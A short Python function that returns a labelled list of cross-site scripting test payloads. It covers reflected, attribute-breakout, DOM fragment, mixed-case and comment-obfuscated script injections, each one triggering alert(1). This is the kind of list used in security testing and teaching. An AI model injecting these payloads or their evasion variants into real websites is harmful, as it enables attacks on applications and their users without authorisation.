def generate_xss_payloads():
    payloads = []

    payloads.append("[Reflected XSS - HTML Context]")
    payloads.append("<script>alert(1)</script>")

    payloads.append("\n[Stored XSS - Attribute Context]")
    payloads.append("\" onmouseover=\"alert(1)")

    payloads.append("\n[DOM XSS - Fragment Context]")
    payloads.append("#<img src=x onerror=alert(1)>")

    payloads.append("\n[Case Manipulation Example]")
    payloads.append("<ScRiPt>alert(1)</ScRiPt>")

    payloads.append("\n[Comment Obfuscation Example]")
    payloads.append("<script/**/>alert(1)</script>")

    return payloads